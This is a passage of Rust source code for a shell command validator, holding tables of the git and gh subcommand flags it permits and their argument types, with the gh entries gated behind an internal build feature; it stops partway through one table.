//! Generated source-shaped flag tables.
//! Maps to: CC `utils/shell/readOnlyCommandValidation.ts`.

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum FlagArgType {
    None,
    Number,
    String,
    Char,
    Braces,
    Eof,
}

#[derive(Clone, Copy, Debug)]
pub struct CommandConfig {
    pub flags: &'static [(&'static str, FlagArgType)],
    pub respects_double_dash: bool,
}

pub fn command_config(
    words: &[String],
    internal: bool,
) -> Option<(&'static str, usize, CommandConfig)> {
    // A caller may express its audience but cannot elevate an external binary:
    // internal command maps remain compile-gated.
    let internal = internal && cfg!(feature = "anthropic_internal");
    let first = words.first()?.as_str();
    match first {
        "git" => {
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("stash")
                && words.get(2).map(String::as_str) == Some("list")
            {
                return Some((
                    "git stash list",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--oneline", FlagArgType::None),
                            ("--graph", FlagArgType::None),
                            ("--decorate", FlagArgType::None),
                            ("--no-decorate", FlagArgType::None),
                            ("--date", FlagArgType::String),
                            ("--relative-date", FlagArgType::None),
                            ("--all", FlagArgType::None),
                            ("--branches", FlagArgType::None),
                            ("--tags", FlagArgType::None),
                            ("--remotes", FlagArgType::None),
                            ("--max-count", FlagArgType::Number),
                            ("-n", FlagArgType::Number),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("config")
                && words.get(2).map(String::as_str) == Some("--get")
            {
                return Some((
                    "git config --get",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--local", FlagArgType::None),
                            ("--global", FlagArgType::None),
                            ("--system", FlagArgType::None),
                            ("--worktree", FlagArgType::None),
                            ("--default", FlagArgType::String),
                            ("--type", FlagArgType::String),
                            ("--bool", FlagArgType::None),
                            ("--int", FlagArgType::None),
                            ("--bool-or-int", FlagArgType::None),
                            ("--path", FlagArgType::None),
                            ("--expiry-date", FlagArgType::None),
                            ("-z", FlagArgType::None),
                            ("--null", FlagArgType::None),
                            ("--name-only", FlagArgType::None),
                            ("--show-origin", FlagArgType::None),
                            ("--show-scope", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("remote")
                && words.get(2).map(String::as_str) == Some("show")
            {
                return Some((
                    "git remote show",
                    3,
                    CommandConfig {
                        flags: &[("-n", FlagArgType::None)],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("stash")
                && words.get(2).map(String::as_str) == Some("show")
            {
                return Some((
                    "git stash show",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--stat", FlagArgType::None),
                            ("--numstat", FlagArgType::None),
                            ("--shortstat", FlagArgType::None),
                            ("--name-only", FlagArgType::None),
                            ("--name-status", FlagArgType::None),
                            ("--color", FlagArgType::None),
                            ("--no-color", FlagArgType::None),
                            ("--patch", FlagArgType::None),
                            ("-p", FlagArgType::None),
                            ("--no-patch", FlagArgType::None),
                            ("--no-ext-diff", FlagArgType::None),
                            ("-s", FlagArgType::None),
                            ("--word-diff", FlagArgType::None),
                            ("--word-diff-regex", FlagArgType::String),
                            ("--diff-filter", FlagArgType::String),
                            ("--abbrev", FlagArgType::Number),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("worktree")
                && words.get(2).map(String::as_str) == Some("list")
            {
                return Some((
                    "git worktree list",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--porcelain", FlagArgType::None),
                            ("-v", FlagArgType::None),
                            ("--verbose", FlagArgType::None),
                            ("--expire", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("diff")
            {
                return Some((
                    "git diff",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--stat", FlagArgType::None),
                            ("--numstat", FlagArgType::None),
                            ("--shortstat", FlagArgType::None),
                            ("--name-only", FlagArgType::None),
                            ("--name-status", FlagArgType::None),
                            ("--color", FlagArgType::None),
                            ("--no-color", FlagArgType::None),
                            ("--dirstat", FlagArgType::None),
                            ("--summary", FlagArgType::None),
                            ("--patch-with-stat", FlagArgType::None),
                            ("--word-diff", FlagArgType::None),
                            ("--word-diff-regex", FlagArgType::String),
                            ("--color-words", FlagArgType::None),
                            ("--no-renames", FlagArgType::None),
                            ("--no-ext-diff", FlagArgType::None),
                            ("--check", FlagArgType::None),
                            ("--ws-error-highlight", FlagArgType::String),
                            ("--full-index", FlagArgType::None),
                            ("--binary", FlagArgType::None),
                            ("--abbrev", FlagArgType::Number),
                            ("--break-rewrites", FlagArgType::None),
                            ("--find-renames", FlagArgType::None),
                            ("--find-copies", FlagArgType::None),
                            ("--find-copies-harder", FlagArgType::None),
                            ("--irreversible-delete", FlagArgType::None),
                            ("--diff-algorithm", FlagArgType::String),
                            ("--histogram", FlagArgType::None),
                            ("--patience", FlagArgType::None),
                            ("--minimal", FlagArgType::None),
                            ("--ignore-space-at-eol", FlagArgType::None),
                            ("--ignore-space-change", FlagArgType::None),
                            ("--ignore-all-space", FlagArgType::None),
                            ("--ignore-blank-lines", FlagArgType::None),
                            ("--inter-hunk-context", FlagArgType::Number),
                            ("--function-context", FlagArgType::None),
                            ("--exit-code", FlagArgType::None),
                            ("--quiet", FlagArgType::None),
                            ("--cached", FlagArgType::None),
                            ("--staged", FlagArgType::None),
                            ("--pickaxe-regex", FlagArgType::None),
                            ("--pickaxe-all", FlagArgType::None),
                            ("--no-index", FlagArgType::None),
                            ("--relative", FlagArgType::String),
                            ("--diff-filter", FlagArgType::String),
                            ("-p", FlagArgType::None),
                            ("-u", FlagArgType::None),
                            ("-s", FlagArgType::None),
                            ("-M", FlagArgType::None),
                            ("-C", FlagArgType::None),
                            ("-B", FlagArgType::None),
                            ("-D", FlagArgType::None),
                            ("-l", FlagArgType::None),
                            ("-S", FlagArgType::String),
                            ("-G", FlagArgType::String),
                            ("-O", FlagArgType::String),
                            ("-R", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("log")
            {
                return Some((
                    "git log",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--oneline", FlagArgType::None),
                            ("--graph", FlagArgType::None),
                            ("--decorate", FlagArgType::None),
                            ("--no-decorate", FlagArgType::None),
                            ("--date", FlagArgType::String),
                            ("--relative-date", FlagArgType::None),
                            ("--all", FlagArgType::None),
                            ("--branches", FlagArgType::None),
                            ("--tags", FlagArgType::None),
                            ("--remotes", FlagArgType::None),
                            ("--since", FlagArgType::String),
                            ("--after", FlagArgType::String),
                            ("--until", FlagArgType::String),
                            ("--before", FlagArgType::String),
                            ("--max-count", FlagArgType::Number),
                            ("-n", FlagArgType::Number),
                            ("--stat", FlagArgType::None),
                            ("--numstat", FlagArgType::None),
                            ("--shortstat", FlagArgType::None),
                            ("--name-only", FlagArgType::None),
                            ("--name-status", FlagArgType::None),
                            ("--color", FlagArgType::None),
                            ("--no-color", FlagArgType::None),
                            ("--patch", FlagArgType::None),
                            ("-p", FlagArgType::None),
                            ("--no-patch", FlagArgType::None),
                            ("--no-ext-diff", FlagArgType::None),
                            ("-s", FlagArgType::None),
                            ("--author", FlagArgType::String),
                            ("--committer", FlagArgType::String),
                            ("--grep", FlagArgType::String),
                            ("--abbrev-commit", FlagArgType::None),
                            ("--full-history", FlagArgType::None),
                            ("--dense", FlagArgType::None),
                            ("--sparse", FlagArgType::None),
                            ("--simplify-merges", FlagArgType::None),
                            ("--ancestry-path", FlagArgType::None),
                            ("--source", FlagArgType::None),
                            ("--first-parent", FlagArgType::None),
                            ("--merges", FlagArgType::None),
                            ("--no-merges", FlagArgType::None),
                            ("--reverse", FlagArgType::None),
                            ("--walk-reflogs", FlagArgType::None),
                            ("--skip", FlagArgType::Number),
                            ("--max-age", FlagArgType::Number),
                            ("--min-age", FlagArgType::Number),
                            ("--no-min-parents", FlagArgType::None),
                            ("--no-max-parents", FlagArgType::None),
                            ("--follow", FlagArgType::None),
                            ("--no-walk", FlagArgType::None),
                            ("--left-right", FlagArgType::None),
                            ("--cherry-mark", FlagArgType::None),
                            ("--cherry-pick", FlagArgType::None),
                            ("--boundary", FlagArgType::None),
                            ("--topo-order", FlagArgType::None),
                            ("--date-order", FlagArgType::None),
                            ("--author-date-order", FlagArgType::None),
                            ("--pretty", FlagArgType::String),
                            ("--format", FlagArgType::String),
                            ("--diff-filter", FlagArgType::String),
                            ("-S", FlagArgType::String),
                            ("-G", FlagArgType::String),
                            ("--pickaxe-regex", FlagArgType::None),
                            ("--pickaxe-all", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("show")
            {
                return Some((
                    "git show",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--oneline", FlagArgType::None),
                            ("--graph", FlagArgType::None),
                            ("--decorate", FlagArgType::None),
                            ("--no-decorate", FlagArgType::None),
                            ("--date", FlagArgType::String),
                            ("--relative-date", FlagArgType::None),
                            ("--stat", FlagArgType::None),
                            ("--numstat", FlagArgType::None),
                            ("--shortstat", FlagArgType::None),
                            ("--name-only", FlagArgType::None),
                            ("--name-status", FlagArgType::None),
                            ("--color", FlagArgType::None),
                            ("--no-color", FlagArgType::None),
                            ("--patch", FlagArgType::None),
                            ("-p", FlagArgType::None),
                            ("--no-patch", FlagArgType::None),
                            ("--no-ext-diff", FlagArgType::None),
                            ("-s", FlagArgType::None),
                            ("--abbrev-commit", FlagArgType::None),
                            ("--word-diff", FlagArgType::None),
                            ("--word-diff-regex", FlagArgType::String),
                            ("--color-words", FlagArgType::None),
                            ("--pretty", FlagArgType::String),
                            ("--format", FlagArgType::String),
                            ("--first-parent", FlagArgType::None),
                            ("--raw", FlagArgType::None),
                            ("--diff-filter", FlagArgType::String),
                            ("-m", FlagArgType::None),
                            ("--quiet", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("shortlog")
            {
                return Some((
                    "git shortlog",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--all", FlagArgType::None),
                            ("--branches", FlagArgType::None),
                            ("--tags", FlagArgType::None),
                            ("--remotes", FlagArgType::None),
                            ("--since", FlagArgType::String),
                            ("--after", FlagArgType::String),
                            ("--until", FlagArgType::String),
                            ("--before", FlagArgType::String),
                            ("-s", FlagArgType::None),
                            ("--summary", FlagArgType::None),
                            ("-n", FlagArgType::None),
                            ("--numbered", FlagArgType::None),
                            ("-e", FlagArgType::None),
                            ("--email", FlagArgType::None),
                            ("-c", FlagArgType::None),
                            ("--committer", FlagArgType::None),
                            ("--group", FlagArgType::String),
                            ("--format", FlagArgType::String),
                            ("--no-merges", FlagArgType::None),
                            ("--author", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("reflog")
            {
                return Some((
                    "git reflog",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--oneline", FlagArgType::None),
                            ("--graph", FlagArgType::None),
                            ("--decorate", FlagArgType::None),
                            ("--no-decorate", FlagArgType::None),
                            ("--date", FlagArgType::String),
                            ("--relative-date", FlagArgType::None),
                            ("--all", FlagArgType::None),
                            ("--branches", FlagArgType::None),
                            ("--tags", FlagArgType::None),
                            ("--remotes", FlagArgType::None),
                            ("--since", FlagArgType::String),
                            ("--after", FlagArgType::String),
                            ("--until", FlagArgType::String),
                            ("--before", FlagArgType::String),
                            ("--max-count", FlagArgType::Number),
                            ("-n", FlagArgType::Number),
                            ("--author", FlagArgType::String),
                            ("--committer", FlagArgType::String),
                            ("--grep", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("ls-remote")
            {
                return Some((
                    "git ls-remote",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--branches", FlagArgType::None),
                            ("-b", FlagArgType::None),
                            ("--tags", FlagArgType::None),
                            ("-t", FlagArgType::None),
                            ("--heads", FlagArgType::None),
                            ("-h", FlagArgType::None),
                            ("--refs", FlagArgType::None),
                            ("--quiet", FlagArgType::None),
                            ("-q", FlagArgType::None),
                            ("--exit-code", FlagArgType::None),
                            ("--get-url", FlagArgType::None),
                            ("--symref", FlagArgType::None),
                            ("--sort", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("status")
            {
                return Some((
                    "git status",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--short", FlagArgType::None),
                            ("-s", FlagArgType::None),
                            ("--branch", FlagArgType::None),
                            ("-b", FlagArgType::None),
                            ("--porcelain", FlagArgType::None),
                            ("--long", FlagArgType::None),
                            ("--verbose", FlagArgType::None),
                            ("-v", FlagArgType::None),
                            ("--untracked-files", FlagArgType::String),
                            ("-u", FlagArgType::String),
                            ("--ignored", FlagArgType::None),
                            ("--ignore-submodules", FlagArgType::String),
                            ("--column", FlagArgType::None),
                            ("--no-column", FlagArgType::None),
                            ("--ahead-behind", FlagArgType::None),
                            ("--no-ahead-behind", FlagArgType::None),
                            ("--renames", FlagArgType::None),
                            ("--no-renames", FlagArgType::None),
                            ("--find-renames", FlagArgType::String),
                            ("-M", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("blame")
            {
                return Some((
                    "git blame",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--color", FlagArgType::None),
                            ("--no-color", FlagArgType::None),
                            ("-L", FlagArgType::String),
                            ("--porcelain", FlagArgType::None),
                            ("-p", FlagArgType::None),
                            ("--line-porcelain", FlagArgType::None),
                            ("--incremental", FlagArgType::None),
                            ("--root", FlagArgType::None),
                            ("--show-stats", FlagArgType::None),
                            ("--show-name", FlagArgType::None),
                            ("--show-number", FlagArgType::None),
                            ("-n", FlagArgType::None),
                            ("--show-email", FlagArgType::None),
                            ("-e", FlagArgType::None),
                            ("-f", FlagArgType::None),
                            ("--date", FlagArgType::String),
                            ("-w", FlagArgType::None),
                            ("--ignore-rev", FlagArgType::String),
                            ("--ignore-revs-file", FlagArgType::String),
                            ("-M", FlagArgType::None),
                            ("-C", FlagArgType::None),
                            ("--score-debug", FlagArgType::None),
                            ("--abbrev", FlagArgType::Number),
                            ("-s", FlagArgType::None),
                            ("-l", FlagArgType::None),
                            ("-t", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("ls-files")
            {
                return Some((
                    "git ls-files",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--cached", FlagArgType::None),
                            ("-c", FlagArgType::None),
                            ("--deleted", FlagArgType::None),
                            ("-d", FlagArgType::None),
                            ("--modified", FlagArgType::None),
                            ("-m", FlagArgType::None),
                            ("--others", FlagArgType::None),
                            ("-o", FlagArgType::None),
                            ("--ignored", FlagArgType::None),
                            ("-i", FlagArgType::None),
                            ("--stage", FlagArgType::None),
                            ("-s", FlagArgType::None),
                            ("--killed", FlagArgType::None),
                            ("-k", FlagArgType::None),
                            ("--unmerged", FlagArgType::None),
                            ("-u", FlagArgType::None),
                            ("--directory", FlagArgType::None),
                            ("--no-empty-directory", FlagArgType::None),
                            ("--eol", FlagArgType::None),
                            ("--full-name", FlagArgType::None),
                            ("--abbrev", FlagArgType::Number),
                            ("--debug", FlagArgType::None),
                            ("-z", FlagArgType::None),
                            ("-t", FlagArgType::None),
                            ("-v", FlagArgType::None),
                            ("-f", FlagArgType::None),
                            ("--exclude", FlagArgType::String),
                            ("-x", FlagArgType::String),
                            ("--exclude-from", FlagArgType::String),
                            ("-X", FlagArgType::String),
                            ("--exclude-per-directory", FlagArgType::String),
                            ("--exclude-standard", FlagArgType::None),
                            ("--error-unmatch", FlagArgType::None),
                            ("--recurse-submodules", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("remote")
            {
                return Some((
                    "git remote",
                    2,
                    CommandConfig {
                        flags: &[("-v", FlagArgType::None), ("--verbose", FlagArgType::None)],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("merge-base")
            {
                return Some((
                    "git merge-base",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--is-ancestor", FlagArgType::None),
                            ("--fork-point", FlagArgType::None),
                            ("--octopus", FlagArgType::None),
                            ("--independent", FlagArgType::None),
                            ("--all", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("rev-parse")
            {
                return Some((
                    "git rev-parse",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--verify", FlagArgType::None),
                            ("--short", FlagArgType::String),
                            ("--abbrev-ref", FlagArgType::None),
                            ("--symbolic", FlagArgType::None),
                            ("--symbolic-full-name", FlagArgType::None),
                            ("--show-toplevel", FlagArgType::None),
                            ("--show-cdup", FlagArgType::None),
                            ("--show-prefix", FlagArgType::None),
                            ("--git-dir", FlagArgType::None),
                            ("--git-common-dir", FlagArgType::None),
                            ("--absolute-git-dir", FlagArgType::None),
                            ("--show-superproject-working-tree", FlagArgType::None),
                            ("--is-inside-work-tree", FlagArgType::None),
                            ("--is-inside-git-dir", FlagArgType::None),
                            ("--is-bare-repository", FlagArgType::None),
                            ("--is-shallow-repository", FlagArgType::None),
                            ("--is-shallow-update", FlagArgType::None),
                            ("--path-prefix", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("rev-list")
            {
                return Some((
                    "git rev-list",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--all", FlagArgType::None),
                            ("--branches", FlagArgType::None),
                            ("--tags", FlagArgType::None),
                            ("--remotes", FlagArgType::None),
                            ("--since", FlagArgType::String),
                            ("--after", FlagArgType::String),
                            ("--until", FlagArgType::String),
                            ("--before", FlagArgType::String),
                            ("--max-count", FlagArgType::Number),
                            ("-n", FlagArgType::Number),
                            ("--author", FlagArgType::String),
                            ("--committer", FlagArgType::String),
                            ("--grep", FlagArgType::String),
                            ("--count", FlagArgType::None),
                            ("--reverse", FlagArgType::None),
                            ("--first-parent", FlagArgType::None),
                            ("--ancestry-path", FlagArgType::None),
                            ("--merges", FlagArgType::None),
                            ("--no-merges", FlagArgType::None),
                            ("--min-parents", FlagArgType::Number),
                            ("--max-parents", FlagArgType::Number),
                            ("--no-min-parents", FlagArgType::None),
                            ("--no-max-parents", FlagArgType::None),
                            ("--skip", FlagArgType::Number),
                            ("--max-age", FlagArgType::Number),
                            ("--min-age", FlagArgType::Number),
                            ("--walk-reflogs", FlagArgType::None),
                            ("--oneline", FlagArgType::None),
                            ("--abbrev-commit", FlagArgType::None),
                            ("--pretty", FlagArgType::String),
                            ("--format", FlagArgType::String),
                            ("--abbrev", FlagArgType::Number),
                            ("--full-history", FlagArgType::None),
                            ("--dense", FlagArgType::None),
                            ("--sparse", FlagArgType::None),
                            ("--source", FlagArgType::None),
                            ("--graph", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("describe")
            {
                return Some((
                    "git describe",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--tags", FlagArgType::None),
                            ("--match", FlagArgType::String),
                            ("--exclude", FlagArgType::String),
                            ("--long", FlagArgType::None),
                            ("--abbrev", FlagArgType::Number),
                            ("--always", FlagArgType::None),
                            ("--contains", FlagArgType::None),
                            ("--first-match", FlagArgType::None),
                            ("--exact-match", FlagArgType::None),
                            ("--candidates", FlagArgType::Number),
                            ("--dirty", FlagArgType::None),
                            ("--broken", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("cat-file")
            {
                return Some((
                    "git cat-file",
                    2,
                    CommandConfig {
                        flags: &[
                            ("-t", FlagArgType::None),
                            ("-s", FlagArgType::None),
                            ("-p", FlagArgType::None),
                            ("-e", FlagArgType::None),
                            ("--batch-check", FlagArgType::None),
                            ("--allow-undetermined-type", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("for-each-ref")
            {
                return Some((
                    "git for-each-ref",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--format", FlagArgType::String),
                            ("--sort", FlagArgType::String),
                            ("--count", FlagArgType::Number),
                            ("--contains", FlagArgType::String),
                            ("--no-contains", FlagArgType::String),
                            ("--merged", FlagArgType::String),
                            ("--no-merged", FlagArgType::String),
                            ("--points-at", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("grep")
            {
                return Some((
                    "git grep",
                    2,
                    CommandConfig {
                        flags: &[
                            ("-e", FlagArgType::String),
                            ("-E", FlagArgType::None),
                            ("--extended-regexp", FlagArgType::None),
                            ("-G", FlagArgType::None),
                            ("--basic-regexp", FlagArgType::None),
                            ("-F", FlagArgType::None),
                            ("--fixed-strings", FlagArgType::None),
                            ("-P", FlagArgType::None),
                            ("--perl-regexp", FlagArgType::None),
                            ("-i", FlagArgType::None),
                            ("--ignore-case", FlagArgType::None),
                            ("-v", FlagArgType::None),
                            ("--invert-match", FlagArgType::None),
                            ("-w", FlagArgType::None),
                            ("--word-regexp", FlagArgType::None),
                            ("-n", FlagArgType::None),
                            ("--line-number", FlagArgType::None),
                            ("-c", FlagArgType::None),
                            ("--count", FlagArgType::None),
                            ("-l", FlagArgType::None),
                            ("--files-with-matches", FlagArgType::None),
                            ("-L", FlagArgType::None),
                            ("--files-without-match", FlagArgType::None),
                            ("-h", FlagArgType::None),
                            ("-H", FlagArgType::None),
                            ("--heading", FlagArgType::None),
                            ("--break", FlagArgType::None),
                            ("--full-name", FlagArgType::None),
                            ("--color", FlagArgType::None),
                            ("--no-color", FlagArgType::None),
                            ("-o", FlagArgType::None),
                            ("--only-matching", FlagArgType::None),
                            ("-A", FlagArgType::Number),
                            ("--after-context", FlagArgType::Number),
                            ("-B", FlagArgType::Number),
                            ("--before-context", FlagArgType::Number),
                            ("-C", FlagArgType::Number),
                            ("--context", FlagArgType::Number),
                            ("--and", FlagArgType::None),
                            ("--or", FlagArgType::None),
                            ("--not", FlagArgType::None),
                            ("--max-depth", FlagArgType::Number),
                            ("--untracked", FlagArgType::None),
                            ("--no-index", FlagArgType::None),
                            ("--recurse-submodules", FlagArgType::None),
                            ("--cached", FlagArgType::None),
                            ("--threads", FlagArgType::Number),
                            ("-q", FlagArgType::None),
                            ("--quiet", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("tag")
            {
                return Some((
                    "git tag",
                    2,
                    CommandConfig {
                        flags: &[
                            ("-l", FlagArgType::None),
                            ("--list", FlagArgType::None),
                            ("-n", FlagArgType::Number),
                            ("--contains", FlagArgType::String),
                            ("--no-contains", FlagArgType::String),
                            ("--merged", FlagArgType::String),
                            ("--no-merged", FlagArgType::String),
                            ("--sort", FlagArgType::String),
                            ("--format", FlagArgType::String),
                            ("--points-at", FlagArgType::String),
                            ("--column", FlagArgType::None),
                            ("--no-column", FlagArgType::None),
                            ("-i", FlagArgType::None),
                            ("--ignore-case", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("git")
                && words.get(1).map(String::as_str) == Some("branch")
            {
                return Some((
                    "git branch",
                    2,
                    CommandConfig {
                        flags: &[
                            ("-l", FlagArgType::None),
                            ("--list", FlagArgType::None),
                            ("-a", FlagArgType::None),
                            ("--all", FlagArgType::None),
                            ("-r", FlagArgType::None),
                            ("--remotes", FlagArgType::None),
                            ("-v", FlagArgType::None),
                            ("-vv", FlagArgType::None),
                            ("--verbose", FlagArgType::None),
                            ("--color", FlagArgType::None),
                            ("--no-color", FlagArgType::None),
                            ("--column", FlagArgType::None),
                            ("--no-column", FlagArgType::None),
                            ("--abbrev", FlagArgType::Number),
                            ("--no-abbrev", FlagArgType::None),
                            ("--contains", FlagArgType::String),
                            ("--no-contains", FlagArgType::String),
                            ("--merged", FlagArgType::None),
                            ("--no-merged", FlagArgType::None),
                            ("--points-at", FlagArgType::String),
                            ("--sort", FlagArgType::String),
                            ("--show-current", FlagArgType::None),
                            ("-i", FlagArgType::None),
                            ("--ignore-case", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            None
        }
        "gh" => {
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("pr")
                && words.get(2).map(String::as_str) == Some("view")
            {
                return Some((
                    "gh pr view",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--json", FlagArgType::String),
                            ("--comments", FlagArgType::None),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("pr")
                && words.get(2).map(String::as_str) == Some("list")
            {
                return Some((
                    "gh pr list",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--state", FlagArgType::String),
                            ("-s", FlagArgType::String),
                            ("--author", FlagArgType::String),
                            ("--assignee", FlagArgType::String),
                            ("--label", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--base", FlagArgType::String),
                            ("--head", FlagArgType::String),
                            ("--search", FlagArgType::String),
                            ("--json", FlagArgType::String),
                            ("--draft", FlagArgType::None),
                            ("--app", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("pr")
                && words.get(2).map(String::as_str) == Some("diff")
            {
                return Some((
                    "gh pr diff",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--color", FlagArgType::String),
                            ("--name-only", FlagArgType::None),
                            ("--patch", FlagArgType::None),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("pr")
                && words.get(2).map(String::as_str) == Some("checks")
            {
                return Some((
                    "gh pr checks",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--watch", FlagArgType::None),
                            ("--required", FlagArgType::None),
                            ("--fail-fast", FlagArgType::None),
                            ("--json", FlagArgType::String),
                            ("--interval", FlagArgType::Number),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("issue")
                && words.get(2).map(String::as_str) == Some("view")
            {
                return Some((
                    "gh issue view",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--json", FlagArgType::String),
                            ("--comments", FlagArgType::None),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("issue")
                && words.get(2).map(String::as_str) == Some("list")
            {
                return Some((
                    "gh issue list",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--state", FlagArgType::String),
                            ("-s", FlagArgType::String),
                            ("--assignee", FlagArgType::String),
                            ("--author", FlagArgType::String),
                            ("--label", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--milestone", FlagArgType::String),
                            ("--search", FlagArgType::String),
                            ("--json", FlagArgType::String),
                            ("--app", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("repo")
                && words.get(2).map(String::as_str) == Some("view")
            {
                return Some((
                    "gh repo view",
                    3,
                    CommandConfig {
                        flags: &[("--json", FlagArgType::String)],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("run")
                && words.get(2).map(String::as_str) == Some("list")
            {
                return Some((
                    "gh run list",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--branch", FlagArgType::String),
                            ("-b", FlagArgType::String),
                            ("--status", FlagArgType::String),
                            ("-s", FlagArgType::String),
                            ("--workflow", FlagArgType::String),
                            ("-w", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--json", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                            ("--event", FlagArgType::String),
